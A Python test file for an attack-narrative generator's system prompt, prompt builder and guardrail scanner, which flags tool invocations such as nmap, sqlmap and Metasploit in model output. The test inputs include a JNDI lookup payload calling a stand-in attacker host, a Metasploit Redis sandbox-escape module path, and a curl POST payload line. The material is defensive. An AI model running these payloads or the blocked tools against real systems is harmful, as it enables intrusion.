"""Tests for SYSTEM_PROMPT shape, build_narrative_prompt, and guardrail sweep."""

from __future__ import annotations

import unittest

from attack_simulator.prompts import (
    SYSTEM_PROMPT,
    build_narrative_prompt,
    scan_for_tool_invocations,
)


CONFIRMED_VERDICT = {
    "cve_id": "CVE-2022-0543",
    "verdict": "CONFIRMED",
    "reason": "Redis 6.2.6 unpatched Debian variant, reachable, no auth.",
    "evidence": {
        "network_state": "port 6379 reachable:true, banner Redis 6.2.6",
        "package_version": "redis 6.2.6 upstream image",
    },
    "probe_command": "redis-cli -h 127.0.0.1 INFO server",
    "probe_output": "# Server\nredis_version:6.2.6\n",
}


class SystemPromptShapeTests(unittest.TestCase):
    def test_prompt_names_three_sections(self) -> None:
        for section in ("### Recon", "### Discovery", "### Exploitation"):
            self.assertIn(section, SYSTEM_PROMPT)

    def test_prompt_forbids_specific_tool_invocations(self) -> None:
        # These are load-bearing prohibitions; catching regressions if
        # someone softens the prompt.
        for tool in ("nmap", "sqlmap", "msfconsole", "curl -X POST", "hydra"):
            self.assertIn(tool, SYSTEM_PROMPT)
        self.assertIn("HARD PROHIBITIONS", SYSTEM_PROMPT)

    def test_prompt_forbids_payload_strings(self) -> None:
        self.assertIn("payload", SYSTEM_PROMPT.lower())
        self.assertIn("shellcode", SYSTEM_PROMPT.lower())

    def test_prompt_specifies_length_range(self) -> None:
        # 150-250 words is what the SYSTEM_PROMPT currently states; assert
        # the numbers appear so an accidental deletion is caught.
        self.assertIn("150", SYSTEM_PROMPT)
        self.assertIn("250", SYSTEM_PROMPT)

    def test_prompt_frames_defender_audience(self) -> None:
        self.assertIn("defenders", SYSTEM_PROMPT)


class BuildNarrativePromptTests(unittest.TestCase):
    def test_prompt_includes_cve_id_and_reason(self) -> None:
        prompt = build_narrative_prompt(CONFIRMED_VERDICT)
        self.assertIn("CVE-2022-0543", prompt)
        self.assertIn("Redis 6.2.6 unpatched", prompt)

    def test_prompt_includes_evidence_json(self) -> None:
        prompt = build_narrative_prompt(CONFIRMED_VERDICT)
        self.assertIn("network_state", prompt)
        self.assertIn("6379", prompt)
        self.assertIn("package_version", prompt)

    def test_prompt_includes_probe_output_fenced(self) -> None:
        prompt = build_narrative_prompt(CONFIRMED_VERDICT)
        self.assertIn("redis-cli -h 127.0.0.1 INFO server", prompt)
        self.assertIn("```", prompt)
        self.assertIn("redis_version:6.2.6", prompt)

    def test_prompt_tolerates_empty_verdict(self) -> None:
        prompt = build_narrative_prompt({})
        self.assertIn("CVE-UNKNOWN", prompt)
        self.assertIn("(no reason recorded)", prompt)

    def test_prompt_asks_for_narrative_only(self) -> None:
        prompt = build_narrative_prompt(CONFIRMED_VERDICT)
        self.assertIn("Return only the narrative", prompt)

    def test_prompt_truncates_huge_probe_output(self) -> None:
        big = "x" * 5000
        verdict = dict(CONFIRMED_VERDICT); verdict["probe_output"] = big
        prompt = build_narrative_prompt(verdict)
        self.assertIn("truncated", prompt)


class GuardrailSweepTests(unittest.TestCase):
    def test_clean_narrative_has_no_hits(self) -> None:
        clean = (
            "### Recon\nAn external attacker enumerates the target's exposed ports and "
            "discovers a Redis service.\n\n### Discovery\nThe attacker fingerprints the "
            "service and identifies the vulnerable version.\n\n### Exploitation\nThe "
            "attacker's next move is Lua-sandbox escape leading to arbitrary code execution "
            "in the Redis process context."
        )
        self.assertEqual(scan_for_tool_invocations(clean), [])

    def test_nmap_invocation_flagged(self) -> None:
        text = "### Recon\nThe attacker runs `nmap -sV` against the target."
        hits = scan_for_tool_invocations(text)
        self.assertIn("nmap invocation", hits)

    def test_sqlmap_invocation_flagged(self) -> None:
        text = "The attacker uses sqlmap to automate the injection."
        self.assertIn("sqlmap invocation", scan_for_tool_invocations(text))

    def test_metasploit_module_flagged(self) -> None:
        text = "use exploit/multi/http/redis_lua_sandbox_escape"
        self.assertIn("metasploit invocation", scan_for_tool_invocations(text))

    def test_msfconsole_flagged(self) -> None:
        text = "The attacker launches msfconsole and searches for a matching module."
        self.assertIn("metasploit invocation", scan_for_tool_invocations(text))

    def test_curl_payload_flagged(self) -> None:
        text = 'curl -X POST http://target/api -d "payload"'
        self.assertIn("curl payload command", scan_for_tool_invocations(text))

    def test_edb_id_flagged(self) -> None:
        text = "See EDB-46778 for the public PoC."
        self.assertIn("exploit-DB id", scan_for_tool_invocations(text))

    def test_jndi_payload_flagged(self) -> None:
        text = "${jndi:ldap://attacker/x}"
        self.assertIn("JNDI lookup payload", scan_for_tool_invocations(text))

    def test_multiple_hits_deduped(self) -> None:
        text = "nmap -sV; then more nmap -A output"
        hits = scan_for_tool_invocations(text)
        self.assertEqual(hits.count("nmap invocation"), 1)

    def test_case_insensitive_curl_pattern(self) -> None:
        text = "Curl -X post http://target"
        self.assertIn("curl payload command", scan_for_tool_invocations(text))


if __name__ == "__main__":
    unittest.main()
